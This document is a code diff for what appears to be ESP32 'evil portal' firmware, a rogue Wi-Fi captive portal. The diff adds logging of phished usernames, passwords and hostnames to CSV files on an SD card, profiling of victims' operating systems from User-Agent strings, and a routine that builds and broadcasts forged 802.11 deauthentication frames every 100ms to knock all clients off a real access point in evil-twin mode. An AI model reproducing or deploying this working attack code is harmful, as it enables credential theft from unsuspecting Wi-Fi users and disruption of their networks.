@@ -183,6 +183,9 @@ static std::vector<capture_t> s_captures;
 static std::mutex s_captures_mx;
 #define MAX_CAPTURES 256
 
+static void url_decode(char *dst, size_t dst_len, const char *src, size_t src_len);
+static void setup_log_path(void);
+
 #ifdef ARDUINO
 static DNSServer s_dns;
 #endif
@@ -213,10 +216,25 @@ static void serve_captive_html(web_req_t *r, const char *html)
     web_resp_html(r, 200, html);
 }
 
+static int classify_user_agent(const char *ua)
+{
+    if (!ua || !*ua) return 5;
+    if (strstr(ua, "iPhone") || strstr(ua, "iPad") || strstr(ua, "CFNetwork")) return 0;
+    if (strstr(ua, "Android")) return 1;
+    if (strstr(ua, "Windows NT") || strstr(ua, "Windows")) return 2;
+    if (strstr(ua, "Macintosh") || strstr(ua, "Mac OS X")) return 3;
+    if (strstr(ua, "Linux") && !strstr(ua, "Android")) return 4;
+    return 5;
+}
+
 static void handle_captive_request(web_req_t *r)
 {
     if (!s_active) return;
     s_probes_total++;
+
+    /* Classify client OS from User-Agent */
+    int vendor = classify_user_agent(r->user_agent);
+    if (vendor >= 0 && vendor < 6) s_vendor_counts[vendor]++;
 
     /* POST /login — capture credentials */
     if (strcmp(r->method, "POST") == 0 && strcmp(r->path, "/login") == 0) {
@@ -265,6 +283,18 @@ static void handle_captive_request(web_req_t *r)
                 s_captures.push_back(cap);
             }
             s_attempts = (uint32_t)s_captures.size();
+
+            /* Log to SD card */
+#ifdef ARDUINO
+            if (s_logpath[0]) {
+                FILE *f = fopen(s_logpath, "a");
+                if (f) {
+                    fprintf(f, "%lld,\"%s\",\"%s\",\"%s\"\n",
+                            (long long)cap.ts, cap.username, cap.password, cap.hostname);
+                    fclose(f);
+                }
+            }
+#endif
         }
 
         serve_captive_html(r, SUCCESS_HTML);
@@ -385,7 +415,7 @@ static void start_standalone(web_req_t *r)
     snprintf(s_ssid, sizeof(s_ssid), "%s", ssid.c_str());
     s_template_idx = template_idx >= 0 && template_idx < (int)BUILTIN_COUNT ? template_idx : 0;
     s_active_template = BUILTIN_TEMPLATES[s_template_idx].html;
-    s_started = tools_epoch();
+    s_started = tools_epoch(); setup_log_path();
     s_attempts = 0; s_confirmed = 0; s_clients = 0; s_probes_total = 0;
     memset(s_vendor_counts, 0, sizeof(s_vendor_counts));
     s_error = NULL;
@@ -446,7 +476,7 @@ static void start_twin(web_req_t *r)
     s_twin_coherent = coherent;
     s_template_idx = template_idx >= 0 && template_idx < (int)BUILTIN_COUNT ? template_idx : 0;
     s_active_template = BUILTIN_TEMPLATES[s_template_idx].html;
-    s_started = tools_epoch();
+    s_started = tools_epoch(); setup_log_path();
     s_attempts = 0; s_confirmed = 0; s_clients = 0; s_probes_total = 0;
     memset(s_vendor_counts, 0, sizeof(s_vendor_counts));
     s_error = NULL; s_deauth_frames = 0;
@@ -487,7 +517,7 @@ static void start_karma(web_req_t *r)
     snprintf(s_ssid, sizeof(s_ssid), "%s", lure_ssid);
     s_template_idx = template_idx >= 0 && template_idx < (int)BUILTIN_COUNT ? template_idx : 0;
     s_active_template = BUILTIN_TEMPLATES[s_template_idx].html;
-    s_started = tools_epoch();
+    s_started = tools_epoch(); setup_log_path();
     s_attempts = 0; s_confirmed = 0; s_clients = 0; s_probes_total = 0;
     memset(s_vendor_counts, 0, sizeof(s_vendor_counts));
     s_error = NULL;
@@ -675,12 +705,79 @@ static bool handle(web_req_t *r)
 
 /* ═══════════════════════════════════════════════ Tick / lifecycle ════════════ */
 
+/* ── SD credential logging ── */
+
+static void setup_log_path(void)
+{
+#ifdef ARDUINO
+    time_t now = (time_t)tools_epoch();
+    struct tm *tm = localtime(&now);
+    snprintf(s_logpath, sizeof(s_logpath), "/sd/data/evilportal/ep-%04d%02d%02d-%02d%02d%02d.csv",
+             tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
+             tm->tm_hour, tm->tm_min, tm->tm_sec);
+#else
+    snprintf(s_logpath, sizeof(s_logpath), "/sd/data/evilportal/ep-sim.csv");
+#endif
+}
+
+/* ── Evil-twin deauth frame injection ── */
+
+#ifdef ARDUINO
+#define DEAUTH_FRAME_SIZE 26
+
+static void build_deauth_frame(uint8_t *frame, const uint8_t *dst, const uint8_t *src, uint16_t reason)
+{
+    memset(frame, 0, DEAUTH_FRAME_SIZE);
+    frame[0] = 0xC0; frame[1] = 0x00;
+    memcpy(frame + 4, dst, 6);
+    memcpy(frame + 10, src, 6);
+    memcpy(frame + 16, src, 6);
+    frame[24] = reason & 0xFF;
+    frame[25] = (reason >> 8) & 0xFF;
+}
+
+static bool mac_parse_ep(const char *s, uint8_t *mac)
+{
+    int v[6];
+    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
+    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
+    return true;
+}
+
+static void send_twin_deauth(void)
+{
+    uint8_t bssid[6];
+    if (!mac_parse_ep(s_twin_bssid_str, bssid)) return;
+
+    uint8_t frame[DEAUTH_FRAME_SIZE];
+    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+    /* Deauth broadcast — disconnect all stations from the real AP */
+    build_deauth_frame(frame, bcast, bssid, 0x07);
+    for (int i = 0; i < 5; i++) {
+        frame[22] = (uint8_t)(s_deauth_frames & 0xFF);
+        frame[23] = (uint8_t)((s_deauth_frames >> 8) & 0xFF);
+        esp_wifi_80211_tx(frame, DEAUTH_FRAME_SIZE, 0);
+        s_deauth_frames++;
+    }
+}
+#endif
+
 static void evilportal_tick(uint32_t now_ms)
 {
     (void)now_ms;
     if (!s_active) return;
 #ifdef ARDUINO
     s_dns.processNextDnsRequest();
+
+    /* Evil-twin deauth: send deauth frames about every 100ms */
+    if (s_mode == EP_MODE_TWIN && s_twin_bssid_str[0]) {
+        static uint32_t last_deauth = 0;
+        if (now_ms - last_deauth >= 100) {
+            last_deauth = now_ms;
+            send_twin_deauth();
+        }
+    }
 #endif
     /* Auto-stop */
     if (s_auto_base_s > 0) {
